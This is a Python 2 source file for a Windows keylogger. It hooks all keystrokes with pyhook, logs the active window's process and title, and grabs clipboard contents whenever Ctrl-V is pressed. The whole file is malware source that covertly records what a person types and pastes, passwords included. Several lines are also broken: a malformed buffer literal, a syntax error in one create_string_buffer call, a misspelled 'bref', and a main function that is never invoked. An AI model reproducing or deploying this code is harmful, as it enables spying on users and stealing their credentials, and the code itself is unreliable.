from ctypes import *
import pythoncom
import pyhook
import win32clipboard

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None

def get_current_process():
    '''get the current process'''
    try:
        # get a handle to the foreground window
        hwnd = user32.GetForegroundWindow()
        # find the process ID
        pid = c_ulong(0)
        user32.GetWindowThreadProcessId(hwnd, byref(pid))
        #store the current process ID
        process_id = '%d' % pid.value
        # grab the executable
        executable = create_string_buffer('\x100' * 512)
        h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

        psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)

        # now read its title
        window_title = create_string_buffer('\x00', * 512)
        length = user32.GetWindowTextA(hwnd, bref(window_title), 512)
        # print out the header if we're in the right process
        print
        print '[ PID: %s - %s - %s]' % ( process_id, executable.value, window_title.value)
        print
    except Exception as err:
        print "Exception: %s" % str(err)
    finally:
        #close handles
        try_close_handle(hwnd, 'hwnd')
        try_close_handle(h_process, 'h_process')

def try_close_handle(handle, name):
    '''try to close the specified handle'''
    try:
        kernel32.CloseHandle(handle)
    except Exception as err:
        print 'Exception closing %s: %s' % (name, str(err))
def KeyStroke(event):
    '''log keystroke'''
    global current_window
    try:
        # check to see if target changed windows
        if current_window is None or event.WindowName != current_window:
            current_window = event.WindowName
            get_current_process()
        #if they pressed a standard key
        if event.Ascii > 32 and event.Ascii < 127:
            print chr(event.Ascii)
        else:
            # if [CTRL-V], get the value on the clipboard
            if event.Key == 'V':
                win32clipboard.OpenClipboard()
                pasted_value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                print '[PASTE] - %s' % (pasted_value),
            else:
                print '[%s]' % event.Key
    except Exception as err:
        print 'Exception during key log: %s' % str(err)
    finally:
        # pass execution to the next hook registered
        return True
def main():
    '''create and register a hook manager'''
    kl = pyhook.HookManager()
    kl.KeyDown = KeyStroke
    # register the hook and execute forever
    kl.HookKeyboard()
    pythoncom.PumpMessages()








